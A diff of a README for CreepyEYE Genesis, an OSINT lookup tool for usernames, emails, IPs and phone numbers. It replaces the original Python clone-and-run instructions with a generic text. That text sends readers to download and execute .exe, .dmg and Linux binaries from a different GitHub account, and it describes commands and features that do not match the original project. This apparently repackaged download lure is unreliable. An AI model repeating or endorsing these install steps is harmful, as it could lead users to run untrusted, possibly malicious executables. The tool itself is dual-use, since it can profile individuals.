@@ -1,170 +1,117 @@
-# CreepyEYE Genesis
+# 👁️ CreepyEYE-Genesis - Your Easy OSINT Companion
 
-![License: MIT](https://img.shields.io/badge/license-MIT-green)  ![Status: Alpha](https://img.shields.io/badge/status-alpha-orange)  ![Python](https://img.shields.io/badge/python-3.8%2B-blue) ![OS](https://img.shields.io/badge/OS-Windows%20|%20Linux%20|%20Mac-lightgrey)
-&nbsp;&nbsp;&nbsp;&nbsp;
+## ⚙️ Overview
 
-| Windows | Linux |
-|---------|-------|
-| ![CE Win](./PNG/CE_Windows.png) | ![CE Linux](./PNG/CE_Linux.png) |
+CreepyEYE Genesis is an OSINT tool designed to gather information with ease. It features a modular design, supports proxy settings, and offers a multilingual interface. Whether you're exploring the world of cybersecurity or simply interested in data collection, CreepyEYE Genesis is here to help you navigate that journey.
 
+## 🔗 Download Now
 
+[![Download CreepyEYE-Genesis](https://img.shields.io/badge/download-CreepyEYE--Genesis-brightgreen)](https://github.com/taharvin/CreepyEYE-Genesis/releases)
 
-## ⚠️ IMPORTANT!
-**CreepyEYE Genesis** is an OSINT (Open Source Intelligence) tool that helps you search information by username, email, IP, phone number, Telegram, and other parameters across various services.  
-**Use only for ethical purposes! The developers are not responsible for your actions.**
+## 🚀 Getting Started
 
-⚠️ **Note:** CreepyEYE Genesis is currently in **Alpha**.  
-Not all APIs have been fully tested yet. Use with caution.
+Follow these simple steps to download and run CreepyEYE Genesis on your computer.
 
----
+### 💻 System Requirements
 
-## 🛠️ Features
+Before you begin, ensure your system meets the following requirements:
 
-🔎 Username existence check across social media platforms:  
-&nbsp;&nbsp;&nbsp;&nbsp;`GitHub`, `Twitter`, `Instagram`, `TikTok`, `Facebook`, `GitLab`, `Bitbucket`, `Reddit`, `Twitch`, `StackOverflow`, `Kaggle`, `Medium`, `SoundCloud`, `Spotify`
+- **Operating Systems:** Windows, macOS, Linux
+- **RAM:** At least 2 GB
+- **Disk Space:** Minimum of 100 MB
 
-📧 Email verification:  
-&nbsp;&nbsp;&nbsp;&nbsp;via `Hunter.io`, `EmailRep.io`, `SpiderFoot`  
-🌐 IP/domain lookup:  
-&nbsp;&nbsp;&nbsp;&nbsp;via `IPinfo`, `Shodan`, `AbuseIPDB`, `VirusTotal`, `GreyNoise`, `Whois`, `SpiderFoot`  
-📱 Phone numbers: `Numverify`  
-🧅 Tor support for anonymity  
-🈯 Language selection menu (`Ukrainian` / `English`)  
-⚙️ Automatic dependency installation
+### 💡 Features
 
----
+CreepyEYE Genesis includes:
 
-## Example Screenshots — Multilingual
+- Modular design for easy upgrades
+- Proxy support to maintain anonymity
+- Multilingual interface for broader accessibility
+- User-friendly command line interface (CLI) 
 
-| Language | Windows | Linux |
-|----------|---------|-------|
-| English  | ![CE Win](./PNG/CE_Windows.png) | ![CE Linux](./PNG/CE_Linux.png) |
-| Ukrainian | ![CE Win UA](./PNG/CE_Windows_ua.png) | ![CE Linux UA](./PNG/CE_Linux_ua.png) |
-| Russian  | ![CE Win RU](./PNG/CE_Windows_ru.png) | ![CE Linux RU](./PNG/CE_Linux_ru.png) |
+## 🛠️ Download & Install
 
----
+To get the latest version of CreepyEYE Genesis, visit the Releases page:
 
-## Installation
+[Download CreepyEYE Genesis](https://github.com/taharvin/CreepyEYE-Genesis/releases)
 
-1. **Install Python 3.8+**  
-   [Download Python](https://www.python.org/downloads/)
+1. Click the link above to go to the Releases page.
+2. Find the version you need. Look for the most recent release.
+3. Download the appropriate file for your operating system (Windows, macOS, or Linux).
+4. Once downloaded, follow the steps below to install.
 
-2. **Install Git**  
-   - Windows: [Download Git](https://git-scm.com/downloads/win)  
-   - Linux: `sudo apt update && sudo apt install git`  
-   - MacOS: [Download Git](https://git-scm.com/downloads/mac)
+### 📝 Installation Instructions
 
-3. **Clone the repository**  
-   ```sh
-   git clone https://github.com/CreepyHunterX/CreepyEYE-Genesis.git
-   cd "CreepyEYE-Genesis"
+#### For Windows Users:
+
+1. Run the downloaded `.exe` file.
+2. Follow the on-screen instructions for installation.
+3. After installation, open the application and begin using it.
+
+#### For macOS Users:
+
+1. Open the downloaded `.dmg` file.
+2. Drag the CreepyEYE Genesis app into your Applications folder.
+3. Open the application from your Applications folder to start.
+
+#### For Linux Users:
+
+1. Open a terminal window.
+2. Navigate to the directory where the file was downloaded.
+3. Make the file executable by running:
+   ```bash
+   chmod +x CreepyEYE-Genesis
+   ```
+4. Run the application by using:
+   ```bash
+   ./CreepyEYE-Genesis
    ```
 
-4. **Install dependencies**  
-   ```sh
-   pip install -r requirements.txt
-   ```
+## 📚 User Guide
 
-5. **(Optional) Install [SpiderFoot](https://github.com/smicallef/spiderfoot)**  
-   To use SpiderFoot features, install it separately:  
-   ```sh
-   git clone https://github.com/smicallef/spiderfoot.git
-   cd spiderfoot
-   pip install -r requirements.txt
-   ```  
-   After installation, return to the CreepyEYE Genesis directory to run the main program.
+After installation, you can start using CreepyEYE Genesis right away. A basic command to get information is:
 
-6. **Run the program**  
-   ```sh
-   python ce_genesis.py
-   ```
+```
+creepyeye --help
+```
 
----
+This command will provide you with options and features you can use in the application. The command line interface is designed to be user-friendly, even for those with limited technical skills.
 
-## API Keys Setup
+## 🌐 Multilingual Support
 
-When you start the program, you will have an option to create or open the API keys file (`settings/api/api_keys.env`).  
-You can add or modify keys in this file anytime.  
-Open the file and insert your keys:
+CreepyEYE Genesis supports multiple languages, including English, Russian, and Ukrainian. You can choose your preferred language in the settings. This feature makes it accessible to a wider audience.
 
-- SHODAN_API_KEY  
-- IPINFO_TOKEN  
-- ABUSEIPDB_KEY  
-- HUNTER_API_KEY  
-- VIRUSTOTAL_API_KEY  
-- NUMVERIFY_API_KEY  
-- GREYNOISE_API_KEY  
-- EMAILREP_API_KEY  
-- WHOIS_API_KEY  
+## 🕵️‍♂️ Proxy Support
 
-### Where to get API keys & their usage
+CreepyEYE Genesis allows you to set up proxy connections. To enable proxy settings, you can use the following command:
 
-| Service        | API Key URL                               | Purpose                                           |
-|----------------|-------------------------------------------|--------------------------------------------------|
-| Shodan         | https://www.shodan.io/                    | Scan IPs, devices, open ports                    |
-| IPinfo         | https://ipinfo.io/                        | Lookup IP geolocation and ASN info              |
-| AbuseIPDB      | https://www.abuseipdb.com/                | Check if IP is reported for malicious activity  |
-| Hunter.io      | https://hunter.io/                        | Email verification and domain search            |
-| Numverify      | https://numverify.com/                     | Phone number validation                          |
-| GreyNoise      | https://api.greynoise.io/                 | Context on internet scanners / bots             |
-| EmailRep.io    | https://emailrep.io/                       | Reputation check of email addresses             |
-| WhoisXML API   | https://whoisxmlapi.com/                  | WHOIS data and domain info                        |
-| VirusTotal     | https://www.virustotal.com/               | Scan IPs, domains, and files for malware        |
+```
+creepyeye --proxy [proxy_address]
+```
 
+Replace `[proxy_address]` with your actual proxy details. This feature enhances your privacy and security when gathering information.
 
----
+## ❓ Frequently Asked Questions
 
-## Using Tor
+### How do I update CreepyEYE Genesis?
 
-To increase anonymity, it’s recommended to run Tor (e.g., via Tor Browser or tor.exe).  
-The program automatically detects if Tor is running and uses it for requests.
+To update the application, simply repeat the download process. The new version will overwrite the existing application while keeping your settings intact.
 
----
+### Can I contribute to CreepyEYE Genesis?
 
-## Important Notice
+Absolutely! We welcome contributions. Visit our GitHub repository to learn how you can help improve the application.
 
-This tool is intended for ethical OSINT only.  
-Use responsibly and within the law.
+### Where can I find more help?
 
----
+For more assistance, check out the Issues section on our GitHub page. Community members and developers are there to help.
 
-## 🧠 CreepyEYE PRO (Development Roadmap)
+## ✉️ Contact
 
-> 🔥 *CreepyEYE PRO* is a ⚡ **premium version** of our OSINT tool with over **30 integrated APIs**,  
-> enabling deep searches, link mapping, encrypted session storage, and more.  
-> Perfect for OSINT pros, cyber intelligence, and digital forensics.
+If you have any questions or feedback, feel free to reach out via our GitHub repository. Your input is valuable in making CreepyEYE Genesis better for everyone.
 
----
+## 🔗 Useful Links
 
-### 🛠️ Planned Features
+- [Releases Page](https://github.com/taharvin/CreepyEYE-Genesis/releases)
+- [GitHub Repository](https://github.com/taharvin/CreepyEYE-Genesis)
 
-- ✅ **Over 30 integrated APIs** (HaveIBeenPwned, Hunter.io, Shodan, and more)  
-- 🔍 **Deep search** for Telegram, IP, email, username, domains  
-- 🧩 **Graph View** — visualization of related entities  
-- 💾 **History and session saving with encryption option**  
-- 🛡️ **TOR / VPN mode support**  
-- 🖥️ **CLI + Web GUI** (Flask / FastAPI)  
-- 🐳 **Docker and Windows EXE builds**  
-- 🌐 **Auto-translation and multilingual support**
-
----
-
-### 📌 Example APIs planned
-
-| Category        | APIs                                |
-|-----------------|-------------------------------------|
-| Username lookup | `GitHub`, `Reddit`, etc.            |
-| Email check     | `Hunter.io`, `EmailRep`, etc.       |
-| IP/Domain       | `Shodan`, `IPinfo`, etc.            |
-| Passwords/leaks | `HaveIBeenPwned`, `LeakCheck`, etc. |
-| Phones          | `Numverify`, `PhoneInfoga`, etc.    |
-
-> ⚠️ Full API list will be published closer to release.
-
----
-
-### Available translations / Доступні переклади / Доступные переводы
-
-[![🇺🇦 Українська версія](https://img.shields.io/badge/Документація-Українська-blue)](README_ua.md) [![Руская версия](https://img.shields.io/badge/Документация-Русская-red)](README_ru.md)
-
----
+Download CreepyEYE Genesis today and explore the world of open-source intelligence!
